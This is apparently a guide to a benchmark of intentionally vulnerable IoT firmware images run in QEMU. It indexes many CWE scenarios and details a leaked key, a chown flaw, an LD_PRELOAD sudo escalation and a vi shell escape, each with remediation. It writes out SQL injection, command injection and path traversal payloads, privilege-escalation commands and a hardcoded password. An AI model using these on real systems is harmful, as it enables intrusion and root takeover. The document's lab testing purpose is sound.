# Payloads

## How to use this guide

Start by choosing a scenario from the [manual test index](#manual-test-index)
below. Scenarios are built and booted in one of two ways, described in
[Common setup](#common-setup): some have a ready-made firmware id, others are
selected by combining a device keyword with a scenario keyword. Each scenario
then explains its own manual test, inputs and expected results in its own
section further down. The complete 34-image benchmark index, including the
shared CWE-78 per-device scenarios, is in
[device-payloads.md](device-payloads.md).

> **Warning:** these images are intentionally vulnerable. Run them only in an
> isolated, disposable QEMU lab. Never deploy them or expose them to untrusted
> networks.

### Common setup

- **Host**: the computer running Docker (and, for the device-and-keyword
  scenarios below, QEMU). Open a terminal at the root of this repository,
  where `compose.yaml` and `scripts/` are located.
- **Guest**: the Linux firmware running inside QEMU. For guest/serial tests,
  wait for `login:` in the QEMU terminal and sign in with username `root` and
  password `routeradmin`. The password is not displayed while you type.
- **Second host terminal**: use this for SSH, TCP, Modbus, FTP, CoAP and MQTT
  requests, and for host-side checks and firmware inspection; keep QEMU
  running in the first terminal. Run HTTP/dashboard tests in the host browser
  or with `curl`.
- **Always stop the previous guest before booting the next one.**
  `run-qemu-docker.sh` uses host networking, so a running guest keeps its
  forwarded ports (`8080`, `2222`, `9090`, `1883`, `1502`, `17754`, `18000`,
  `2575`, ...) and the next boot fails with
  `Could not set up host forwarding rule`. One-liner that stops any running
  IoTBench guest:

  ```bash
  docker ps -q --filter name=iotbench-qemu | xargs -r docker stop
  ```

You need Docker Compose, plus QEMU and `zstd` on the host for the scenarios
that boot with `scripts/run-qemu.sh` directly. If your host has Docker but no
host-installed QEMU, the ready-made-firmware-id scenarios below boot instead
through `scripts/run-qemu-docker.sh`, which reuses the `qemu-system-aarch64`
binary already built into the `yocto-build` Docker volume and needs nothing
installed on the host; the manual test for each scenario is identical either
way. The Python clients used below require Python 3, or Python 3.9+ for some
of the numbered test scenarios; SSH and FTP tests additionally require `ssh`
and `curl`, respectively. On macOS, install QEMU and zstd with
`brew install qemu zstd`. Before the first build, or if your builder predates
the Java layer, run on the host:

```bash
docker compose build yocto
```

For scripted dashboard calls, load `/`, read the `meta[name="dashboard-token"]`
value, then POST JSON to `/api.php` with header `X-Dashboard-Token: <token>`.
The dashboard forms already perform that step; a plain browser visit is
enough for manual testing.

### Device keywords

The table below applies only to scenarios selected by device and scenario
keyword (see
[Build and boot: device and scenario keyword](#build-and-boot-device-and-scenario-keyword));
scenarios with a ready-made firmware id (see
[Build and boot: ready-made firmware id](#build-and-boot-ready-made-firmware-id))
do not use it.

Use the exact keyword from this table when selecting a firmware:

| Device type | Keyword |
| --- | --- |
| Router | `router` |
| IP camera | `ipcamera` |
| Smart plug | `smartplug` |
| Thermostat | `thermostat` |
| Programmable logic controller | `plc` |
| Smart bulb | `smartbulb` |
| Smart home hub | `smarthub` |
| Environmental sensor | `envsensor` |
| Smart speaker | `smartspeaker` |
| Health monitor | `healthmonitor` |
| Door lock | `doorlock` |

The firmware ID is `<device-keyword>-<scenario-keyword>`, for example
`router-cwe521-permit-empty-passwords` or `doorlock-cwe022-bad-sudo-rights`.
Choose the scenario keyword from the [manual test index](#manual-test-index).
All scenarios listed there under a scenario keyword have a firmware recipe
for each of these eleven devices; the fixture's payloads and expected
vulnerability signals are shared across devices, while device identity,
peripheral data and native service ports can differ.

### Build and boot: ready-made firmware id

Run the following commands in the same host terminal at the repository root.
Change only `TEST_FIRMWARE` to select a different scenario, then rerun the
block. The default architecture is `qemuarm64`.

```bash
TEST_FIRMWARE=router-cwe276-leaked-private-key

docker ps -q --filter name=iotbench-qemu | xargs -r docker stop
FIRMWARE="$TEST_FIRMWARE" docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu-docker.sh
```

The first build of each firmware compiles only the scenario-specific recipes
on top of the shared Yocto cache, so it is fast once that cache is warm. The
runner forwards, on `127.0.0.1`: the dashboard on `:8080`, SSH on `:2222`, the
vulnerable TCP service on `:9090`, MQTT on `:1883`, Modbus on `:1502`, the ZCL
bridge on `:17754`, the media parser on `:18000` and the patient-monitor
protocol on `:2575`, for the images that need them. Stop the guest when done.
This works in any terminal, whichever way the guest was started, because it
does not depend on `TEST_FIRMWARE` (the per-scenario boot commands set only
`FIRMWARE` for that one command):

```bash
docker ps -q --filter name=iotbench-qemu | xargs -r docker stop
```

To stop one guest by name, use the container name printed by
`docker ps --format '{{.Names}}'`. It is `iotbench-qemu-<firmware id>-qemuarm64`,
for example `iotbench-qemu-router-cwe276-leaked-private-key-qemuarm64`.

### Build and boot: device and scenario keyword

Run the following commands in the same host terminal at the repository root.
Change only `TEST_DEVICE` and `TEST_SCENARIO` to select a different firmware,
then rerun the block. The default architecture is `qemuarm64`; for another
supported architecture, set `YOCTO_MACHINE` consistently for build and boot.

On **Apple Silicon**, you can accelerate `qemuarm64` boots by running these
commands in the host terminal before the boot commands:

```bash
export QEMU_ACCEL=hvf
export QEMU_CPU=host
```

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe022-bad-sudo-rights
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

The build exports its kernel and root filesystem to
`deploy-images/<device-keyword>-<scenario-keyword>/<machine>/`. If you
already have an up-to-date export, skip the Docker command and run the QEMU
command after setting the three variables. After boot, use the selected
scenario's test below. For `bad-sudo-rights`, go directly to the
[shared manual test](#manual-test-shared-by-all-devices); for
`permit-empty-passwords`, go directly to [Test 1](#test-1) and run the manual
check in the browser.

This command and the manual guides set HTTP to **18080**: when the selected
image exposes its device dashboard, open <http://127.0.0.1:18080>; always use
the port printed by the launcher. Later technical examples may use the
default port **8080**. Apache, native path/buffer/connection/symlink and Java
fixtures use the serial console and have no dashboard or forwarded network
port; the embedded-auth extra locks root and is inspected offline as
described in its test. SSH uses **2222**, FTP **22121**, CoAP UDP **5683** and
MQTT **21883** in the guides that require them; MQTT port 21883 is set only
in the MQTT guide, other boot commands retain the device's native service
ports. Run one firmware at a time to avoid port conflicts.

For scenarios requiring another protocol, use the port settings in their
guide when booting: for example, add `QEMU_FTP_PORT=22121` for the FTP test
or `QEMU_MQTT_PORT=21883` for the MQTT test. Before testing, wait for the
guest to show `login:` and for the service to respond; browser and network
tests also require the boot to finish. To quit QEMU, press **Ctrl-A**,
release the keys, then press **X**. The launcher normally uses a disposable
snapshot.

For CLI tests, run `echo "exit=$?"` **immediately after** the command you
want to check. A status of `0` means success, but the specific output
described in each guide confirms the defect. `INTENTIONALLY INSECURE
SYNTHETIC TEST FIXTURE` messages are expected notices. Scripts that boot QEMU
themselves must run after you close the manual instance; `--get` clients
contact an already running guest.

### Manual test index

| Test | Firmware id / scenario keyword | Where to run it | Evidence of the defect |
| --- | --- | --- | --- |
| [Leaked Private Key](#leaked-private-key) | `router-cwe276-leaked-private-key` | Browser / host | `/debug/device-private.key` returns a PEM private key over plain HTTP |
| [Bad Chown Rights: WAN Policy File](#bad-chown-rights-wan-policy-file) | `router-cwe276-bad-chown-rights` | Guest | `routerweb` overwrites a root-consumed policy file it does not own by design |
| [Hardcoded Credentials: LD_PRELOAD Sudo Rule](#hardcoded-credentials-ld_preload-sudo-rule) | `router-cwe798-ld-preload-sudo` | Second host terminal | `LD_PRELOAD` constructor runs with `euid=0` |
| [Hardcoded Credentials: Vi Privilege Escalation](#hardcoded-credentials-vi-privilege-escalation) | `router-cwe798-vi-privilege-escalation` | Second host terminal | `sudo busybox vi` shell-out returns `uid=0(root)` |
| [Writable Root Cron Target](#writable-root-cron-target) | `router-cwe078-writable-root-cron` | Guest | A root cron job echoes injected shell output into a world-writable-by-design file |
| [SSH Hardcoded Backdoor](#ssh-hardcoded-backdoor) | `router-cwe287-ssh-hardcoded-backdoor` | Second host terminal | Undocumented `support` account authenticates over SSH |
| [HTTP Login SQL Injection](#http-login-sql-injection) | `router-cwe089-http-sqli-auth` | Browser | `' OR '1'='1` returns the `admin` role without the real password |
| [Vulnerable Bash Files: Command Injection](#vulnerable-bash-files-command-injection) | `router-cwe078-bash-command-injection` | Browser | `127.0.0.1; id` output includes `uid=995(routerweb)` |
| [Vulnerable C Binaries: Command Injection](#vulnerable-c-binaries-command-injection) | `router-cwe077-c-command-injection` | Browser | `router; id` output includes `uid=995(routerweb)` |
| [Use After Free: Session Cache](#use-after-free-session-cache) | `router-cwe416-use-after-free` | Browser | Helper prints `ACCESS GRANTED via freed object reuse` |
| [Uncontrolled Resource Consumption: Diagnostic DoS](#uncontrolled-resource-consumption-diagnostic-dos) | `router-cwe400-diagnostic-dos` | Browser | Helper allocates and touches attacker-chosen megabytes with no authorization check |
| [Command Injection via Service Interface](#command-injection-via-service-interface) | `router-cwe078-service-interface-injection` | Second host terminal | TCP `:9090` response to `status; id` includes `uid=995(routerweb)` |
| [Path Traversal: 404 Dispatcher](#path-traversal-404-dispatcher) | `router-cwe022-path-traversal` | Browser / host | Double-decoded `..` segments return `/etc/passwd` |
| [IP Camera Recording: Path Traversal](#ip-camera-recording-path-traversal) | `ipcamera-cwe022-recording-path-traversal` | Second host terminal | `recording.cgi?file=../../../../etc/passwd` returns `/etc/passwd` |
| [Smart Plug: Missing Authorization](#smart-plug-missing-authorization) | `smartplug-cwe862-missing-authorization` | Second host terminal | Relay changes state with `actor=guest` and `authorization=skipped` |
| [Thermostat: Command Replay](#thermostat-command-replay) | `thermostat-cwe294-command-replay` | Second host terminal | The identical authenticated frame is accepted twice, `count=1` then `count=2` |
| [Smart Bulb: ZCL Heap Overflow](#smart-bulb-zcl-heap-overflow) | `smartbulb-cwe122-zcl-heap-overflow` | Second host terminal | Response is `HEAP_OVERFLOW zcl-integrity-corrupted` |
| [Smart Hub: Database Stack Overflow](#smart-hub-database-stack-overflow) | `smarthub-cwe121-database-stack-overflow` | Second host terminal | Response is `STACK_OVERFLOW authorization=admin` |
| [Environmental Sensor: Unauthenticated Calibration](#environmental-sensor-unauthenticated-calibration) | `envsensor-cwe306-unauthenticated-calibration` | Second host terminal | Calibration changes with `authenticated=no`, no credential sent |
| [Smart Speaker: ID3 Heap Overflow](#smart-speaker-id3-heap-overflow) | `smartspeaker-cwe122-id3-heap-overflow` | Second host terminal | Response is `HEAP_OVERFLOW decoder-state-corrupted` |
| [Health Monitor: Memory Disclosure](#health-monitor-memory-disclosure) | `healthmonitor-cwe200-memory-disclosure` | Second host terminal | `READ 32 52` returns a synthetic patient record from unrelated device memory |
| [Door Lock: Unlock Replay](#door-lock-unlock-replay) | `doorlock-cwe294-unlock-replay` | Second host terminal | The identical authenticated unlock frame is accepted twice |
| [PLC: Modbus Stack Overflow](#plc-modbus-stack-overflow) | `plc-cwe121-modbus-stack-overflow` | Second host terminal | Vendor Modbus function `0x41` returns `STACK_OVERFLOW` (status `0x01`) |
| [Test 1: SSH empty passwords](#test-1) | `cwe521-permit-empty-passwords` | Browser / guest inspection | Synthetic policy diagnostic permits an empty candidate; corrected control rejects it |
| [Test 2: FTP write permissions](#test-2) | `cwe276-bad-write-rights` | Guest / native curl | Real FTP creates a file in `bad`; `control` and corrected permissions reject creation |
| [Test 3: Telnet plaintext](#test-3) | `cwe798-unencrypted-traffic` | Guest / native Telnet and tcpdump | System login succeeds; packet capture exposes the password and device settings |
| [Test 4: Sudo environment](#test-4) | `cwe798-sudo-environment` | Guest / native sudo and du | Preserved environment doubles the real disk-usage count; explicit -k restores it |
| [Test 5: Cron wildcard](#test-5) | `cwe088-cronjob-wildcard-injection` | Guest | Option-like filename selects the diagnostic; corrected control stays nominal |
| [Test 6: Password leak](#test-6) | `cwe798-password-leak-<variant>` | Guest / extracted firmware | Recovered synthetic credential is accepted; wrong value is rejected |
| [Test 7: REST internal files](#test-7) | `cwe022-rest-internal-files` | Guest / isolated host | Config route returns the restricted synthetic marker; control denies it |
| [Test 8: Apache applications](#test-8) | `cwe<CWE>-apache-web` | Guest / isolated host | Selected defect produces its marker or unauthorized state change |
| [Test 9: C path and filename](#test-9) | `cwe022-native-path-traversal`, `cwe020-native-filename-validation` | Guest / isolated namespace | Disallowed synthetic file is read; outer containment or a nonmatching filename is rejected |
| [Test 10: C buffer overflow](#test-10) | `cwe787-native-buffer-overflow` | Host / guest with ASan | ASan identifies the first out-of-bounds write from a valid 65-byte frame |
| [Test 11: C connection string](#test-11) | `cwe020-native-connection-string` | Guest / host | Injected field changes SQLite from read-only to writable capability |
| [Test 12: C symbolic links](#test-12) | `cwe061-native-symlink-following` | Guest / isolated host | Fixed file follows the synthetic symlink; corrected control denies it |
| [Test 13: Java commands](#test-13) | `cwe078-java-os-command-injection`, `cwe077-java-app-command-injection` | Guest / isolated host | Selected interpreter creates its extra synthetic marker |
| [Test 14: Java deserialization](#test-14) | `cwe502-java-deserialization` | Guest / isolated host | Unexpected class triggers one callback; allowlist control triggers zero |
| [Extra: Embedded pairs](#extra-embedded) | `cwe798-embedded-auth-<variant>` | Host / extracted firmware | Matching synthetic pair is accepted; incorrect fields are denied |
| [3DES backup](#weak-cipher-3des-device-backups) | `cwe327-weak-cipher` | Browser / guest | 3DES is used and identical input produces an identical frame |
| [Root SSH](#permitted-root-ssh-login) | `cwe276-permit-root-login` | Second host terminal | Default password grants `uid=0(root)` |
| [Anonymous FTP](#allow-anonymous-login) | `cwe276-allow-anonymous-login` | Second host terminal | Settings downloaded without real credentials |
| [Support credentials](#hardcoded-credentials) | `cwe798-hardcoded-credentials` | Browser | Backup obtained with the credentials embedded in the firmware |
| [Sudo and traversal](#bad-sudo-rights--path-traversal) | `cwe022-bad-sudo-rights` | Guest | Non-root user reads the private file through the sudo reader |
| [SUID](#privilege-escalation-risk--dangerous-suid-rights) | `cwe250-dangerous-suid-rights` | Guest | `REAL_UID=993`, `EFFECTIVE_UID=0` |
| [Fixed user password](#hardcoded-credentials--hardcoding-user-passwords) | `cwe798-hardcoded-user-passwords` | Guest | Embedded password accepted, incorrect password rejected |
| [CoAP internal files](#coap-server-communicating-with-vulnerable-internal-files) | `cwe862-coap-internal-files` | Second host terminal | `2.05` responses contain internal files without authentication |
| [MQTT internal files](#mqtt-server-communicating-with-vulnerable-internal-files) | `cwe862-mqtt-internal-files` | Second host terminal | Internal topics readable without credentials |
| [Bash traversal](#vulnerable-bash-files--path-traversal) | `cwe022-bash-path-traversal` | Guest | `../` allows reading the internal fixture |
| [Java SQL injection](#vulnerable-java-jars--sql-injection) | `cwe089-java-sql-injection` | Browser / guest | Injection bypasses the public visibility filter |
| [C SQL injection](#vulnerable-c-binaries--sql-injection) | `cwe089-c-sql-injection` | Guest | Injection expands the search to both records |
| [NULL dereference](#vulnerable-c-binaries--null-pointer-dereference) | `cwe476-null-pointer-dereference` | Guest | Supervisor confirms SIGSEGV at address zero |
| [Integer overflow](#vulnerable-c-binaries--integer-overflow) | `cwe190-integer-overflow` | Guest | Product wraps to zero and the batch is accepted |
| [Buffer Overflow esposto tramite service interface](#buffer-overflow-esposto-tramite-service-interface) | `cwe120-service-buffer-overflow` | Isolated host test / guest | ASan identifies a stack write past a 32-byte label |

### Technical references

This document gathers three sets of firmware scenarios, previously
documented separately and now combined into one file.

The first set covers 13 router images that each add one independent
vulnerability package to the shared router dashboard, and 10 device-specific
images that each reproduce a CVE-inspired weakness on one device's native
protocol; every scenario installs the device's normal profile plus exactly
one vulnerability package, none shared across multiple device profiles. The
wire payloads and the CVE each device scenario is inspired by are indexed,
together with the shared CWE-78 per-device scenarios, in
[device-payloads.md](device-payloads.md). All 23 scenarios in this set were
boot-tested end to end; dates, SHA-256 digests of the exported images and the
one defect found and fixed during testing are recorded in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).
That record is a manual boot-and-exploit log, not an automated regression
suite.

The second set is 14 numbered tests covering 39 variants per device, plus an
extra embedded-credential family adding eight more; choose one concrete
variant wherever the index uses a placeholder. The catalog is
[Catalogo_Test_Sicurezza_Firmware_IoT.xlsm](../Catalogo_Test_Sicurezza_Firmware_IoT.xlsm).
Execution evidence belongs in [validation records](validation/); catalog
numbers and variant counts appear in each test's scope section.

The third set documents firmware scenarios and their reproducible lab
payloads across all eleven devices: the shared vendor support account
([Hardcoded credentials](#hardcoded-credentials)); a separate fixed synthetic
account password through local authentication
([Hardcoding User Passwords](#hardcoded-credentials--hardcoding-user-passwords));
unvalidated local path concatenation in a firmware Bash helper
([Vulnerable Bash Files — Path Traversal](#vulnerable-bash-files--path-traversal));
native C argument interpolation into a local SQLite SELECT
([Vulnerable C Binaries — SQL injection](#vulnerable-c-binaries--sql-injection));
an input-dependent record lookup dereferenced without NULL validation
([Vulnerable C Binaries — Null Pointer Dereference](#vulnerable-c-binaries--null-pointer-dereference));
validated numeric input reaching unchecked uint32_t multiplication
([Vulnerable C Binaries — Integer Overflow](#vulnerable-c-binaries--integer-overflow));
and Java bytecode concatenating a record name into a read-only SQLite JDBC
SELECT, bypassing its public-record visibility filter, with one firmware for
every existing device
([Vulnerable Java JARs — SQL Injection](java-sql-injection.md)).

## Leaked Private Key

### Build, boot and manual testing

**What this tests.** A device private key is installed under the web
document root with world-readable permissions and no authentication guards
the path.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe276-leaked-private-key docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe276-leaked-private-key ./scripts/run-qemu-docker.sh
```

**Test — host:**

```bash
curl -s http://127.0.0.1:8080/debug/device-private.key | head -1
```

Expected: `-----BEGIN PRIVATE KEY-----`. No login, token or special header is
needed; the file is served like any other static asset under `/www/pages`.

### Scenario and ground truth

The module recipe is
[`cwe276-leaked-private-key_1.0.bb`](../meta-iotbench/recipes-vulns/cwe276-leaked-private-key/cwe276-leaked-private-key_1.0.bb).
It installs the bundled
[`device-private.key`](../meta-iotbench/recipes-vulns/cwe276-leaked-private-key/files/device-private.key)
fixture to `/www/pages/debug/device-private.key` with mode `0644`, under the
same Lighttpd document root the dashboard serves from. There is no server-side
check that the request is local, authenticated or even expected: any client
that can reach port 80 can read the key.

This is [CWE-276: Incorrect Default Permissions](https://cwe.mitre.org/data/definitions/276.html):
the weakness is the combination of a sensitive asset placed inside a
publicly served directory and world-readable permissions, not a parsing or
injection flaw. A real device would use this key for TLS, device identity or
signing; disclosure lets an attacker impersonate the device or decrypt
captured traffic depending on how the key is actually used elsewhere in the
firmware.

### Build and boot

From the repository root, build and boot as shown in
[Build and boot any device](#build-and-boot-any-device) with
`TEST_FIRMWARE=router-cwe276-leaked-private-key`. No SSH, MQTT or serial
console access is required for this scenario; only the forwarded HTTP port is
used.

### Payload and expected result

| Request | Expected result |
| --- | --- |
| `GET /debug/device-private.key` | `200 OK`, body starts with `-----BEGIN PRIVATE KEY-----` |
| `GET /debug/` (directory listing) | `403`/`404` depending on Lighttpd's directory-listing setting; the file itself is still directly reachable by name |

| Result | Interpretation |
| --- | --- |
| Connection refused or timeout | Investigate port forwarding; the defect has not yet been evaluated |
| `404 Not Found` | Check that the exported image actually includes `cwe276-leaked-private-key`; a different router scenario does not install this file |
| Body starts with `-----BEGIN PRIVATE KEY-----` | Confirmed: an unauthenticated client reads the device private key |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`ca010f28d168dba8c5abf0830506889e32b34ddb2b7134628c4492eb4c1eeefe`. Full
details, including the Git baseline commit, are in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Do not place private keys, or any secret, inside a directory served by the
web server. Keep them outside the document root with restrictive permissions
(for example `0600`, owned by the service account that actually needs them),
and if the dashboard needs to reference device identity, expose only public
material (certificates, public keys) through the web tier. After a fix,
repeat the request above and confirm it returns `404` instead of key
material, then confirm the legitimate consumer of the key (if any) still
works from its restricted path.

## Bad Chown Rights: WAN Policy File

### Build, boot and manual testing

**What this tests.** A configuration file that a root-run WAN policy
consumer is expected to trust is instead owned by the unprivileged
`routerweb` account, so the web-facing service account can rewrite it
directly.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe276-bad-chown-rights docker compose up --build --force-recreate yocto
FIRMWARE=router-cwe276-bad-chown-rights ./scripts/run-qemu-docker.sh
```

Boot this one **without** `QEMU_DETACH=1`: the test runs at the serial
console.

**Test — guest, after logging in as `root` / `routeradmin`:**

```sh
su -s /bin/sh routerweb -c \
  "printf 'DNS_OVERRIDE=attacker-controlled\n' > /etc/iotbench/wan-policy.conf"
cat /etc/iotbench/wan-policy.conf
```

Expected: the file's `DNS_OVERRIDE` line now reads `attacker-controlled`.

### Scenario and ground truth

The module recipe is
[`cwe276-bad-chown-rights_1.0.bb`](../meta-iotbench/recipes-vulns/cwe276-bad-chown-rights/cwe276-bad-chown-rights_1.0.bb).
It installs
[`wan-policy.conf`](../meta-iotbench/recipes-vulns/cwe276-bad-chown-rights/files/wan-policy.conf)
to `/etc/iotbench/wan-policy.conf` with mode `0664` and explicitly
`chown 995:995` — the same UID/GID the recipe also creates for the
`routerweb` system account, i.e. the identity the public web dashboard runs
as. A genuine root-consumed network policy file has no reason to be
group/owner-writable by the web service account; a compromise of the
dashboard process (for example through any of the other router scenarios in
this document) would let an attacker rewrite this file directly, without
needing a separate privilege-escalation bug.

This is [CWE-276: Incorrect Default Permissions](https://cwe.mitre.org/data/definitions/276.html),
the same class as [Leaked Private Key](#leaked-private-key) but on the write
side: the file's ownership, not its content format, is the defect. The
recipe comment in `wan-policy.conf` states the intent plainly: "Root-consumed
WAN policy, intentionally owned by routerweb in this benchmark."

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe276-bad-chown-rights`, but omit `QEMU_DETACH=1`
so the serial console stays attached in the first terminal; this scenario has
no HTTP, SSH or TCP component to exercise from a second terminal.

### Payload and expected result

| Action | Expected result |
| --- | --- |
| `su -s /bin/sh routerweb -c "printf '...' > /etc/iotbench/wan-policy.conf"` | Command succeeds with no permission error |
| `cat /etc/iotbench/wan-policy.conf` | File now contains the attacker-written line |
| `ls -l /etc/iotbench/wan-policy.conf` | Owner/group `995:995` (`routerweb`), mode `-rw-rw-r--` |

| Result | Interpretation |
| --- | --- |
| `Permission denied` on the `su -c` write | The image does not have this vulnerability package installed; confirm the firmware id |
| File content updated, owner `995:995` | Confirmed: the web service account can rewrite the root-consumed policy file |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`c78a2e15589205da0cdee59b4453e6c6ef48542550eb6e897444300957080b7a`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Own root-consumed configuration with `root:root` (or a dedicated group that
excludes the web service account) and mode `0644` or stricter, so only the
process that is actually supposed to change the policy can write it. If the
dashboard genuinely needs to request a policy change, have it write to a
separate, validated request file that a privileged helper reads and applies,
rather than editing the trusted file directly. After a fix, repeat the `su
-c` write above and confirm it fails with `Permission denied`.

## Hardcoded Credentials: LD_PRELOAD Sudo Rule

### Build, boot and manual testing

**What this tests.** A firmware-wide support password grants the
`routerweb` account SSH access, and a permissive sudo rule lets that account
run one fixed binary with `LD_PRELOAD` preserved, reaching root code
execution through the dynamic linker.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe798-ld-preload-sudo docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe798-ld-preload-sudo ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
ssh -p 2222 routerweb@127.0.0.1 \
  'sudo LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target; cat /tmp/iotbench-ldpreload-root'
```

Enter `iotbench` for both the SSH login and the `sudo` prompt. Expected: the
target prints its own `uid`/`euid`, and the marker file records
`euid=0`. If SSH reports a changed host key because a previous image used
the same forwarded port, remove the stale entry with
`ssh-keygen -R '[127.0.0.1]:2222'` and retry.

### Scenario and ground truth

The module recipe is
[`cwe798-ld-preload-sudo_1.0.bb`](../meta-iotbench/recipes-vulns/cwe798-ld-preload-sudo/cwe798-ld-preload-sudo_1.0.bb).
It compiles two helpers,
[`ldpreload-target.c`](../meta-iotbench/recipes-vulns/cwe798-ld-preload-sudo/files/ldpreload-target.c)
(a trivial program that just prints its UID/EUID) and
[`preload-marker.c`](../meta-iotbench/recipes-vulns/cwe798-ld-preload-sudo/files/preload-marker.c)
(a shared object whose `__attribute__((constructor))` function writes
`/tmp/iotbench-ldpreload-root` recording the process's UID/EUID at load
time), and installs the sudoers fragment
[`iotbench-ldpreload-sudoers`](../meta-iotbench/recipes-vulns/cwe798-ld-preload-sudo/files/iotbench-ldpreload-sudoers):

```text
Defaults:routerweb env_keep += "LD_PRELOAD"
routerweb ALL=(root) SETENV: /usr/bin/ldpreload-target
```

`env_keep += "LD_PRELOAD"` is the actual defect: it tells `sudo` to pass the
caller's `LD_PRELOAD` environment variable through to the privileged process
instead of stripping it, so `sudo ldpreload-target` loads an
attacker-supplied shared object with root privileges before `main()` of the
target even runs. The `SETENV` tag additionally lets the invoking user set
arbitrary environment variables on the command line, which is what makes
`sudo LD_PRELOAD=... ldpreload-target` accepted at all rather than requiring
the variable to be pre-set in the caller's shell.

The firmware-wide credential itself is set directly in the image recipe,
[`iotbench-router-cwe798-ld-preload-sudo.bb`](../meta-iotbench/recipes-images/iotbench-router-cwe798-ld-preload-sudo.bb):

```text
EXTRA_USERS_PARAMS:append = " usermod -p '$6$iotbench$EhBo2e24buhGDuzZQTBFBg58AJA3.wI.gOIVDU0A91zC8jaiqiIY//.WW6PfQB6Jf4qnaLLCU7BFkXvuKT1XG1' -s /bin/sh routerweb;"
```

The plaintext is `iotbench` (recorded in the recipe's own comment). This
same literal SHA-512 crypt hash string also appears, byte for byte, in
[Hardcoded Credentials: Vi Privilege Escalation](#hardcoded-credentials-vi-privilege-escalation)
and in [SSH Hardcoded Backdoor](#ssh-hardcoded-backdoor): the same hardcoded
credential, not just the same plaintext password, has been copy-pasted
across three unrelated vulnerability modules. The scenario is
[CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
for the SSH login, chained into a privilege-escalation impact (`LD_PRELOAD`
reaching root) once that login succeeds.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe798-ld-preload-sudo`. Use the second host
terminal for SSH while QEMU stays running in the first.

### Payload and expected result

| Request condition | Expected result |
| --- | --- |
| SSH as `routerweb` with password `iotbench` | Login succeeds |
| `sudo LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target` with password `iotbench` | Allowed by the sudoers rule; target prints `uid=995 euid=0` |
| `cat /tmp/iotbench-ldpreload-root` | Contains `preload constructor ran with uid=995 euid=0` |
| `sudo LD_PRELOAD=... /bin/sh` (any other command) | Rejected: the sudoers rule names only `/usr/bin/ldpreload-target` |

| Result | Interpretation |
| --- | --- |
| SSH `Permission denied` | Wrong password or wrong firmware image; confirm you booted `router-cwe798-ld-preload-sudo` |
| Marker file records `euid=0` | Confirmed: the hardcoded SSH credential plus the `LD_PRELOAD`-preserving sudo rule reach root |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`41a438731f9d696b0099fc6727d19ddda77abde60e62d3116fe1d01334a2d006`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Replace the shared fleet-wide password with a per-device credential, or key
authentication only. Independently of the credential, remove
`env_keep += "LD_PRELOAD"` (and more generally avoid `SETENV` combined with
`env_keep` of linker-influencing variables) from any sudoers rule; `sudo`
strips `LD_PRELOAD` and similar variables from the environment of privileged
commands by default specifically to prevent this class of escalation, so the
fix is to stop re-enabling that default. After a fix, repeat the `sudo
LD_PRELOAD=...` command above and confirm the marker file is not created
with `euid=0`, or that the target's own output is unaffected by the injected
library.

## Hardcoded Credentials: Vi Privilege Escalation

### Build, boot and manual testing

**What this tests.** The same firmware-wide support password as the
previous scenario grants `routerweb` SSH access, but here the sudo rule
authorizes an interactive, general-purpose program — BusyBox `vi` — which can
itself execute a shell.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe798-vi-privilege-escalation docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe798-vi-privilege-escalation ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
ssh -t -p 2222 routerweb@127.0.0.1 'sudo /bin/busybox vi /tmp/iotbench-vi.txt'
```

Enter `iotbench` for both prompts. Inside `vi`, run `:!id` and expect
`uid=0(root)`; exit with `:q!`.

### Scenario and ground truth

The module recipe is
[`cwe798-vi-privilege-escalation_1.0.bb`](../meta-iotbench/recipes-vulns/cwe798-vi-privilege-escalation/cwe798-vi-privilege-escalation_1.0.bb).
It installs a single sudoers fragment,
[`iotbench-vi-sudoers`](../meta-iotbench/recipes-vulns/cwe798-vi-privilege-escalation/files/iotbench-vi-sudoers):

```text
routerweb ALL=(root) /bin/busybox vi *
```

Unlike the restricted, non-interactive target in
[Hardcoded Credentials: LD_PRELOAD Sudo Rule](#hardcoded-credentials-ld_preload-sudo-rule),
this rule authorizes a full-featured text editor as root. BusyBox `vi`
supports `:!<command>` to run an arbitrary shell command and `:r !<command>`
to read a command's output into the buffer, both well-documented
shell-escape features of `vi`-family editors, not a bug in BusyBox itself.
Granting `sudo` on any editor, pager or similarly interactive tool is a
well-known way to reach a root shell; see
